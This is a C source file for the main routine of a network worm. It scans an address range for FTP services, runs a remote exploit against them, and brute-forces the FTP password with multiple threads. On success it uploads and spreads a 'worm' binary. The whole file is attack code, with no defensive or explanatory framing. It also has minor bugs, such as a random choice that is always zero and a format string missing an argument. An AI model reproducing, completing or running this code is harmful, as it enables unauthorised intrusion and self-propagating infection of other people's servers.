#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//---
#include "scanner.h"
#include "bruteforce.h"
#include "exploit.h"
#include "spread.h"

#ifndef ADDRESS_RANGE
#  define ADDRESS_RANGE       "192.168.100.30"
#endif

#ifndef PORT_RANGE
#  define PORT_RANGE          "10-30"
#endif

#ifndef INTERFACE
#  define INTERFACE           "br0"
#endif

#ifndef USE_RAW_SOCKET
#  define USE_RAW_SOCKET      0
#endif

#ifndef FTP_USER
#  define FTP_USER            "rrlm"
#endif

struct bruteforce_arguments {
  struct scan_table *target;
  int thread_id;
};

static pthread_t threads[MAX_THREADS];
static pthread_mutex_t bruteforce_lock;
static int ftp_fd = 0;
static int stop_bruteforce = 0;

void *try_bruteforce(void *arguments) {
  struct bruteforce_arguments *arg;
  char guess[MAX_PASSWORD_LENGTH];
  int fd;

  arg = (struct bruteforce_arguments *) arguments;

  while(stop_bruteforce == 0) {
    pthread_mutex_lock(&bruteforce_lock);

    if(bruteforce(guess, sizeof guess) == 0) {
      stop_bruteforce = 1;
      fprintf(stdout, "Password not found by brute-force method!\n");
    }

    pthread_mutex_unlock(&bruteforce_lock);

    if(stop_bruteforce == 0 && (fd = ftp_try_login(arg->target->address, arg->target->port, FTP_USER, guess, arg->thread_id)) > 0) {
      ftp_fd = fd;
      stop_bruteforce = 1;
      fprintf(stdout, "Connected to FTP! Password is \"%s\"\n", guess);
    }
  }

  return NULL;
}

int main(int argc, const char *argv[]) {
  struct scan_table *target_table, *target;
  struct bruteforce_arguments args[MAX_THREADS];
  int shell_fd, method, err;
  unsigned int i;

  srand(time(NULL));
  pthread_mutex_init(&bruteforce_lock, NULL);
  target_table = scanner(ADDRESS_RANGE, PORT_RANGE, INTERFACE, USE_RAW_SOCKET, 0);

  if(target_table != NULL) {
    for(target = target_table; target != NULL; target = target->next) {
      if(strstr(target->banner, "FTP") != NULL) {
        shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");

        if((method = rand() % 1) == 0) {
          for(i = 0; i < MAX_THREADS; ++i) {
            args[i].target = target;
            args[i].thread_id = i;

            if((err = pthread_create(&threads[i], NULL, &try_bruteforce, (void *) &args[i])) != 0) {
              fprintf(stderr, "Couldn't create thread \"%d\": %s\n", strerror(err));
            }
          }

          for(i = 0; i < MAX_THREADS; ++i) {
            pthread_join(threads[i], NULL);
          }
        } else {

        }

        if(ftp_fd != 0) {
          spread(ftp_fd, "worm", "worm");
          //spread(ftp_fd, "worm.x86_64", "worm.x86_64");
          //spread(ftp_fd, "worm.i386", "worm.i386");
          //spread(ftp_fd, "worm.i686", "worm.i686");
          close(ftp_fd);
        }

        close(shell_fd);
      }
    }
  }

  pthread_mutex_destroy(&bruteforce_lock);
  return 0;
}
